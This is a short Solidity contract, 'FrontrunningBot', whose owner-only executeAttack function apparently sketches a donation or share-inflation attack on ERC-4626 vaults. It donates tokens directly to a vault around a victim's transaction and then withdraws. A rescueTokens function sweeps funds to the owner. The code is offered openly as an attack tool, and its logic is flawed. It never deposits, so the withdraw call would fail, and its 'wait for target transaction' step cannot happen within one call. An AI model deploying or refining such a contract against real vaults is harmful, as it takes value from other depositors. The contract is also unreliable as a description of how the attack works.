// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
    function asset() external view returns (address);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract FrontrunningBot {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function executeAttack(
        address vault,
        uint256 donationAmount,
        address /* targetTx */
    ) external onlyOwner {
        IERC4626 vaultContract = IERC4626(vault);
        address asset = vaultContract.asset();
        IERC20 token = IERC20(asset);
        
        // 1. Approve vault to spend tokens
        token.approve(vault, donationAmount);
        
        // 2. Transfer tokens directly to vault (donation)
        token.transfer(vault, donationAmount);
        
        // 3. Wait for target transaction to execute
        // (In production, this would be handled by the bot's transaction ordering logic)
        
        // 4. Withdraw the donated tokens
        vaultContract.withdraw(donationAmount, address(this), address(this));
    }
    
    // Emergency withdrawal function
    function rescueTokens(address token) external onlyOwner {
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }
} 